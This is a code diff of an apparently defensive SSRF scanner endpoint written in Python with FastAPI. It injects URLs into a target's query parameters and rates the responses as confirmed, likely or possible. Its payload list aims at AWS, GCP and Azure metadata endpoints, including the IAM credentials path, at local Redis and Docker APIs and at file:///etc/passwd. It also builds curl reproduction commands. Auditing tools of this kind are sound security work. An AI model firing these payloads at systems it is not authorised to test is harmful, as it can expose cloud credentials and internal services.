@@ -1,18 +1,31 @@
-"""
-SSRF Scanner — Server-Side Request Forgery vulnerability auditor.
-Tests cloud metadata endpoints, internal loopback IP bypasses, protocol schemes, and internal service ports.
-Inspired by Strix autonomous penetration testing methodologies.
+"""SSRF Scanner — Server-Side Request Forgery vulnerability auditor.
+
+Features high-accuracy confidence taxonomy:
+- Confirmed: Verifiable internal cloud metadata, IAM credentials, or internal daemon response.
+- Likely: Explicit backend connection error traces (e.g. Connection refused to loopback port).
+- Possible: Timing differential or gateway status changes (504/502).
+- Not Detected: No evidence of server-side request execution.
 """
 from __future__ import annotations
 import asyncio
 import re
 import time
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-from typing import List, Dict, Any, Optional
-import httpx
+from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
+from typing import Any, Dict, List, Optional
+
 from fastapi import APIRouter
-from pydantic import BaseModel
-from tools.utils import clean_url, f, ok, err, HEADERS
+from pydantic import BaseModel, Field
+
+from backend.security.confidence import (
+    Confidence,
+    Severity,
+    create_finding,
+    standard_response,
+)
+from backend.security.http_client import SafeResponse, safe_request
+from backend.security.logger import redact_secrets
+from backend.security.target_validator import TargetValidationError, validate_target_url
+from backend.tools.utils import clean_url, err, ok
 
 router = APIRouter(tags=["scanning"])
 
@@ -27,22 +40,22 @@ SSRF_PAYLOADS = [
     {
         "name": "AWS EC2 Metadata (IMDSv1)",
         "vector": "http://169.254.169.254/latest/meta-data/",
-        "sig": [r"ami-id", r"instance-id", r"local-ipv4", r"security-credentials"],
+        "sig": [r"ami-id", r"instance-id", r"local-ipv4", r"security-credentials/"],
         "category": "Cloud Metadata",
         "sev": "critical"
     },
     {
         "name": "AWS Security Credentials",
         "vector": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-        "sig": [r"role-name", r"Code", r"Type", r"AccessKeyId"],
+        "sig": [r'"AccessKeyId"\s*:', r'"SecretAccessKey"\s*:', r'"Token"\s*:'],
         "category": "Cloud Metadata",
         "sev": "critical"
     },
     # GCP Metadata
     {
         "name": "GCP Compute Engine Metadata",
-        "vector": "http://metadata.google.internal/computeMetadata/v1/",
-        "sig": [r"computeMetadata", r"instance", r"project"],
+        "vector": "http://metadata.google.internal/computeMetadata/v1/instance/id",
+        "sig": [r"^[0-9]{15,25}$", r"computeMetadata"],
         "category": "Cloud Metadata",
         "sev": "critical"
     },
@@ -50,7 +63,7 @@ SSRF_PAYLOADS = [
     {
         "name": "Azure Instance Metadata",
         "vector": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-        "sig": [r"compute", r"osType", r"vmId"],
+        "sig": [r'"compute"\s*:\s*\{', r'"vmId"\s*:'],
         "category": "Cloud Metadata",
         "sev": "critical"
     },
@@ -83,25 +96,25 @@ SSRF_PAYLOADS = [
         "category": "Loopback Bypass",
         "sev": "high"
     },
-    # Internal Ports & Protocol Schemes
+    # Internal Ports & Services
     {
         "name": "Internal Redis Port (6379)",
         "vector": "http://127.0.0.1:6379/",
-        "sig": [r"-ERR", r"redis_version", r"redis"],
+        "sig": [r"-ERR\s+", r"redis_version:\s*", r"\+PONG"],
         "category": "Internal Service",
         "sev": "critical"
     },
     {
         "name": "Docker Daemon API (2375)",
         "vector": "http://127.0.0.1:2375/version",
-        "sig": [r"ApiVersion", r"Arch", r"Docker"],
+        "sig": [r'"ApiVersion"\s*:', r'"DockerRootDir"\s*:'],
         "category": "Internal Service",
         "sev": "critical"
     },
     {
         "name": "Local File Protocol (file:///etc/passwd)",
         "vector": "file:///etc/passwd",
-        "sig": [r"root:x:0:0:", r"nobody:", r"/bin/bash"],
+        "sig": [r"root:x:0:0:[^:]*:/root:", r"daemon:x:[0-9]+:[0-9]+:"],
         "category": "Protocol Wrapper",
         "sev": "critical"
     },
@@ -109,14 +122,19 @@ SSRF_PAYLOADS = [
 
 
 class SsrfRequest(BaseModel):
-    target: str
-    param: str = ""
-    mode: str = "all"  # all | cloud | loopback | bypass
+    target: str = Field(..., min_length=1, max_length=2048)
+    param: str = Field("", max_length=128)
+    mode: str = Field("all", max_length=64)
 
 
 @router.post("/ssrf_scanner")
 async def ssrf_scanner(req: SsrfRequest):
     url = clean_url(req.target)
+    try:
+        validate_target_url(url)
+    except TargetValidationError as tve:
+        return err(f"Target validation failed: {tve}")
+
     parsed = urlparse(url)
     existing_qs = parse_qs(parsed.query)
 
@@ -126,10 +144,8 @@ async def ssrf_scanner(req: SsrfRequest):
     elif existing_qs:
         params_to_test = list(existing_qs.keys())
     else:
-        # Fuzz standard SSRF parameter candidates
         params_to_test = ["url", "dest", "target", "redirect", "proxy", "webhook", "path", "feed"]
 
-    # Filter payloads by mode
     if req.mode == "cloud":
         active_payloads = [p for p in SSRF_PAYLOADS if p["category"] == "Cloud Metadata"]
     elif req.mode == "loopback":
@@ -139,140 +155,147 @@ async def ssrf_scanner(req: SsrfRequest):
     else:
         active_payloads = SSRF_PAYLOADS
 
-    findings = []
-    records = []
-    confirmed_vulnerabilities = []
-    pocs = []
-    semaphore = asyncio.Semaphore(10)
+    findings: List[Dict[str, Any]] = []
+    records: List[Dict[str, Any]] = []
+    pocs: List[str] = []
+    semaphore = asyncio.Semaphore(5)
 
-    # Establish baseline request with external canary
+    # Establish baseline request
     baseline_status = 200
     baseline_len = 0
+    baseline_latency = 0.5
     try:
-        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=8) as c:
-            base_r = await c.get(url, headers=HEADERS)
-            baseline_status = base_r.status_code
-            baseline_len = len(base_r.text)
+        t0 = time.time()
+        base_resp = await safe_request("GET", url, timeout=8.0)
+        baseline_latency = time.time() - t0
+        baseline_status = base_resp.status_code
+        baseline_len = len(base_resp.content)
     except Exception:
         pass
 
-    async def test_ssrf_vector(param_name: str, payload_info: dict):
+    async def test_ssrf_vector(param_name: str, payload_info: Dict[str, Any]):
         async with semaphore:
             test_val = payload_info["vector"]
-            # Build query string
             current_params = dict(existing_qs)
             current_params[param_name] = [test_val]
-            # Flatten for urlencode
             flat_params = {k: v[0] if isinstance(v, list) else v for k, v in current_params.items()}
             new_query = urlencode(flat_params)
             test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
 
             try:
-                async with httpx.AsyncClient(verify=False, follow_redirects=False, timeout=6) as client:
-                    t0 = time.time()
-                    resp = await client.get(test_url, headers={**HEADERS, "Metadata-Flavor": "Google"})
-                    elapsed = round((time.time() - t0) * 1000)
+                t0 = time.time()
+                resp = await safe_request("GET", test_url, timeout=7.0)
+                elapsed_ms = round((time.time() - t0) * 1000)
 
-                    body = resp.text
-                    status = resp.status_code
-                    content_len = len(body)
-                    headers_str = str(resp.headers).lower()
+                body = resp.text
+                status_code = resp.status_code
+                content_len = len(resp.content)
 
-                    is_confirmed = False
-                    reason = ""
+                conf = Confidence.NOT_DETECTED
+                reason = ""
+                evidence_text = ""
 
-                    # Check 1: Signatures in response
-                    for sig_pat in payload_info["sig"]:
-                        if re.search(sig_pat, body, re.I):
-                            is_confirmed = True
-                            reason = f"Response body leaked signature matching '{sig_pat}'"
+                # 1. Confirmed signatures check
+                for sig_pat in payload_info.get("sig", []):
+                    m = re.search(sig_pat, body, re.IGNORECASE)
+                    if m:
+                        conf = Confidence.CONFIRMED
+                        snippet = redact_secrets(body[max(0, m.start() - 20): min(len(body), m.end() + 60)])
+                        reason = f"Response body matched verified internal service signature: '{sig_pat}'"
+                        evidence_text = snippet
+                        break
+
+                # 2. Likely backend TCP connection error traces
+                if conf == Confidence.NOT_DETECTED:
+                    backend_error_patterns = [
+                        r"cURL error 7:\s*Failed to connect to (?:127\.0\.0\.1|localhost)",
+                        r"Connection refused.*(?:127\.0\.0\.1|169\.254\.169\.254)",
+                        r"socket\.error:\s*\[Errno 111\]\s*Connection refused",
+                        r"WinError 10061.*actively refused",
+                        r"Failed to open stream: Connection refused",
+                    ]
+                    for b_err in backend_error_patterns:
+                        if re.search(b_err, body, re.IGNORECASE):
+                            conf = Confidence.LIKELY
+                            reason = "Backend server revealed connection refusal error to internal address."
+                            evidence_text = f"Internal socket trace: {b_err}"
                             break
 
-                    # Check 2: Cloud Metadata header disclosure
-                    if "x-aws-ec2-metadata-token-status" in headers_str or "metadata-flavor" in headers_str:
-                        is_confirmed = True
-                        reason = "Server returned cloud metadata headers"
+                # 3. Possible gateway timing differential
+                if conf == Confidence.NOT_DETECTED:
+                    if status_code in (504, 502) and baseline_status == 200:
+                        conf = Confidence.POSSIBLE
+                        reason = f"Server returned gateway timeout/error ({status_code}) when fetching internal target."
+                        evidence_text = f"Status shifted from {baseline_status} to {status_code}"
+                    elif (elapsed_ms / 1000.0) > (baseline_latency + 4.0):
+                        conf = Confidence.POSSIBLE
+                        reason = f"Significant timeout delay ({elapsed_ms}ms vs baseline {round(baseline_latency*1000)}ms)."
+                        evidence_text = f"Latency delay differential: {elapsed_ms}ms"
 
-                    # Check 3: Differential status vs baseline
-                    status_anomaly = False
-                    if status == 200 and baseline_status in (400, 404, 500):
-                        status_anomaly = True
-                    elif status == 500 and "connection refused" in body.lower():
-                        status_anomaly = True
+                if conf in (Confidence.CONFIRMED, Confidence.LIKELY, Confidence.POSSIBLE):
+                    sev = payload_info["sev"] if conf == Confidence.CONFIRMED else ("medium" if conf == Confidence.LIKELY else "low")
+                    findings.append(create_finding(
+                        title=f"SSRF ({conf.value.capitalize()}): {payload_info['name']} via '{param_name}'",
+                        severity=sev,
+                        confidence=conf.value,
+                        detail=f"Injected '{test_val}' into parameter '{param_name}'. {reason} HTTP {status_code} ({content_len} bytes).",
+                        recommendation="Implement strict URL/IP whitelisting, enforce IMDSv2 token hop limits, and block private subnets (RFC 1918 / 169.254.0.0/16).",
+                        evidence=evidence_text,
+                    ))
+                    pocs.append(f"curl -s -k '{test_url}'")
 
-                    curl_cmd = f'curl -s -k "{test_url}"'
+                result_label = "Filtered / Safe"
+                if conf == Confidence.CONFIRMED:
+                    result_label = "💀 CONFIRMED"
+                elif conf == Confidence.LIKELY:
+                    result_label = "🔥 LIKELY"
+                elif conf == Confidence.POSSIBLE:
+                    result_label = "⚠ POSSIBLE"
 
-                    if is_confirmed:
-                        confirmed_vulnerabilities.append({
-                            "param": param_name,
-                            "vector": payload_info["name"],
-                            "target": test_url
-                        })
-                        findings.append(f(
-                            payload_info["sev"],
-                            f"SSRF Detected: {payload_info['name']} (Param: {param_name})",
-                            f"Payload: {test_val} injected into parameter '{param_name}'. {reason}. HTTP {status} ({content_len}B).",
-                            "Implement strict URL/IP whitelisting, disable fetching internal ranges (RFC 1918 / 169.254.169.254), enforce IMDSv2 token hop limits."
-                        ))
-                        pocs.append(f"# Reproduction for {payload_info['name']}:\n{curl_cmd}")
-
-                    records.append({
-                        "Parameter": param_name,
-                        "Vector Name": payload_info["name"],
-                        "Injected Payload": test_val[:35] + ("..." if len(test_val) > 35 else ""),
-                        "HTTP Status": status,
-                        "Latency": f"{elapsed}ms",
-                        "Result": "💀 VULNERABLE" if is_confirmed else ("⚠ Anomaly" if status_anomaly else "Filtered / Safe")
-                    })
-
-            except httpx.TimeoutException:
                 records.append({
                     "Parameter": param_name,
                     "Vector Name": payload_info["name"],
-                    "Injected Payload": test_val[:35],
-                    "HTTP Status": "Timeout",
-                    "Latency": ">6000ms",
-                    "Result": "Timed out (Internal Filter / Drop)"
+                    "Injected Payload": test_val[:35] + ("..." if len(test_val) > 35 else ""),
+                    "HTTP Status": status_code,
+                    "Latency": f"{elapsed_ms}ms",
+                    "Confidence": conf.value,
+                    "Result": result_label,
                 })
+
             except Exception as e:
                 records.append({
                     "Parameter": param_name,
                     "Vector Name": payload_info["name"],
-                    "Injected Payload": test_val[:35],
+                    "Injected Payload": test_val[:35] + ("..." if len(test_val) > 35 else ""),
                     "HTTP Status": 0,
-                    "Latency": "0ms",
-                    "Result": f"Conn Error ({str(e)[:25]})"
+                    "Latency": "Error",
+                    "Confidence": "not_detected",
+                    "Result": f"Error ({str(e)[:30]})",
                 })
 
     tasks = []
     for param in params_to_test:
-        for payload in active_payloads:
-            tasks.append(test_ssrf_vector(param, payload))
+        for pinfo in active_payloads:
+            tasks.append(test_ssrf_vector(param, pinfo))
 
-    await asyncio.gather(*tasks)
+    if tasks:
+        await asyncio.gather(*tasks)
 
-    if not confirmed_vulnerabilities:
-        findings.append(f(
-            "pass",
-            "No Direct SSRF Response Disclosed",
-            f"Tested {len(records)} SSRF injection combinations across parameters {params_to_test}."
-        ))
+    confirmed_count = sum(1 for f in findings if f.get("confidence") == "confirmed")
+    likely_count = sum(1 for f in findings if f.get("confidence") == "likely")
+    possible_count = sum(1 for f in findings if f.get("confidence") == "possible")
 
-    summary = {
-        "Target URL": url,
-        "Parameters Tested": ", ".join(params_to_test),
-        "Vectors Evaluated": len(records),
-        "SSRF Vulnerabilities Found": len(confirmed_vulnerabilities),
-        "Cloud Metadata Exposed": "CRITICAL YES" if any("Cloud" in v["vector"] for v in confirmed_vulnerabilities) else "No",
-    }
-
-    result = {
-        "summary": summary,
+    return ok({
+        "summary": {
+            "Target": url,
+            "Parameters Tested": len(params_to_test),
+            "Vectors Executed": len(records),
+            "Confirmed SSRF": confirmed_count,
+            "Likely SSRF": likely_count,
+            "Possible SSRF": possible_count,
+        },
         "findings": findings,
         "records": records,
-        "record_columns": ["Parameter", "Vector Name", "Injected Payload", "HTTP Status", "Latency", "Result"],
-    }
-    if pocs:
-        result["raw"] = "\n\n".join(pocs)
-
-    return ok(result)
+        "record_columns": ["Parameter", "Vector Name", "Injected Payload", "HTTP Status", "Latency", "Confidence", "Result"],
+        "raw": "\n".join(pocs) if pocs else "No reproducible SSRF evidence detected.",
+    })
